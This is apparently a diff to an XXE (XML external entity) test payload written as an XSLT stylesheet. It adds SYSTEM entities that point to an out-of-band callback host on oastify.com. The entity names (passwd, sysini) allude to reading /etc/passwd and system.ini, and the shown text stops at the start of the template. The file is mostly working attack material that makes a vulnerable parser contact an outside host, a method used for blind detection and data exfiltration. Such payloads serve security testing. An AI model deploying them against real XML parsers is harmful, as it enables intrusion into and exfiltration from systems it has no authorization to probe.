@@ -1,7 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xsl" href="?#"?>
 <!DOCTYPE div [
-  <!ENTITY passwd_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/">
+  <!ENTITY passwd_p        "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/1">
+  <!ENTITY passwd_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/2">
+  <!ENTITY sysini_p        "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/3">
+  <!ENTITY sysini_c SYSTEM "https://fudrndkf5bo9pk80idzbu2hzaqgh49uxj.oastify.com/4">
 ]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
